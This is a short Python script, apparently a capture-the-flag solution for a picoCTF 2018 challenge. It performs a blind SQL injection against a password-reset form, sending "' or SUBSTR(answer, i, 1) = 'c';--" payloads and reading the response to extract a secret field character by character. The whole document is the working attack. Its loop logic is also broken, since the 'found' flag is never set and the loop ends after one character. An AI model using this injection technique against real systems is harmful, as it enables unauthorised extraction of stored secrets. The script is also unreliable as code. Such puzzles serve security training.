import requests

url = 'http://2018shell2.picoctf.com:38834/reset'

answer = ''
for i in range(1,20):
    found = False
    for c in [chr(_) for _ in range(0x30, 0x7b)]:
        query = '\' or SUBSTR(answer, {}, 1) = \'{}\';--'.format(i, c)
        payload = {'Reset Password': query}
        r = requests.post(url, data=payload)
        # print('[+] {}: {}'.format(c, r.text.split('\n')[3]))
        if not 'exist' in r.text:
            answer += c
            print('answer: {}'.format(answer))
            break
    if not found:
        break
print('final answer: {}'.format(answer))